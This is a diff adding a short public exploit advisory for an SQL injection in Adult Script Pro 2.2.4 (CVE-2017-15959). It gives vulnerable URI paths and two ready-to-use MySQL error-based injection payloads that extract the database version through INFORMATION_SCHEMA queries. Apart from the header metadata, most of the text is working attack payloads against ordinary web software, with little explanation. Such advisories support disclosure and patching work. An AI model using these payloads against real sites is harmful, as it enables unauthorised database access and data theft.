@@ -1,0 +1,32 @@
+# # # # # 
+# Exploit Title: Adult Script Pro 2.2.4 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.adultscriptpro.com/
+# Software Link: http://www.adultscriptpro.com/order.html
+# Demo: http://www.adultscriptpro.com/demo.html
+# Version: 2.2.4
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15959
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/download/[SQL]
+# 
+# VerAyari+aNd(SELeCT+1+FroM(SeLECT+CoUNT(*),CoNCat((SeLECT+(SELECT+CoNCat(CaST(VERSIoN()+aS+ChaR),0x7e,0x496873616E53656e63616e))+FroM+INFoRMaTIoN_SChEMa.TaBLES+LIMIT+0,1),FLooR(RaNd(0)*2))x+FroM+INFoRMaTIoN_SChEMa.TaBLES+GRoUP+BY+x)a)
+# 
+# Parameter: #1* (URI)
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: http://localhost/[PATH]/download/Verayari AND (SELECT 4247 FROM(SELECT COUNT(*),CONCAT(0x716a717a71,(SELECT (ELT(4247=4247,1))),0x717a707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+# Etc..
+# # # # #
